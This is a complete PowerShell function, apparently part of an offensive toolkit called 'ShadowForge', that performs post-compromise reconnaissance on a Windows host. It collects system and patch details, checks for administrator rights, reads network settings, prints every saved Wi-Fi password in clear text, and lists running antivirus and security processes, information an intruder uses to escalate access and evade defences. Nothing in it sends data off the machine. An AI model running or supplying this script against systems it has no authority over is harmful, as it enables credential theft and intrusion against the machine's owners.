function Invoke-ShadowRecon {
    Write-Host "`n[+] ShadowForge Recon - Gathering intel . . ." -ForegroundColor Red
    Write-Host "=====================================================`n" -ForegroundColor DarkRed

    # 1. Basic system info
    Write-Host "[+] Basic System Info" -ForegroundColor Cyan
    systeminfo | findstr /i "OS Name OS Version System Type Hotfix"

    # 2. Current user and privileges
    Write-Host "`n[+] Current User and Privileges" -ForegroundColor Cyan
    whoami
    whoami /groups | findstr "High Mandatory Level" > $null 2>&1
    if ($LASTEXITCODE -eq 0) { Write-Host "    -> Running as ADMINISTRATOR" -ForegroundColor Green }

    # 3. Network info
    Write-Host "`n[+] Network Configuration" -ForegroundColor Cyan
    ipconfig | findstr /i "IPv4 Gateway DNS"

    # 4. Saved Wi-Fi passwords
    Write-Host "`n[+] Saved Wi-Fi Profiles and Passwords" -ForegroundColor Cyan
    (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        netsh wlan show profile name="$name" key=clear | Select-String "Key Content"
    }

    # 5. AV / security processes
    Write-Host "`n[+] Running AV / Security Processes" -ForegroundColor Cyan
    Get-Process | Where-Object {
        $_.Path -like "*Windows Defender*" -or
        $_.Path -like "*McAfee*" -or
        $_.Path -like "*Symantec*" -or
        $_.Name -match "msmpeng|msseces|avast|avg|kaspersky|norton"
    } | Select-Object Name, Path | Format-Table -AutoSize

    Write-Host "`n[Done] Recon complete!" -ForegroundColor Red
}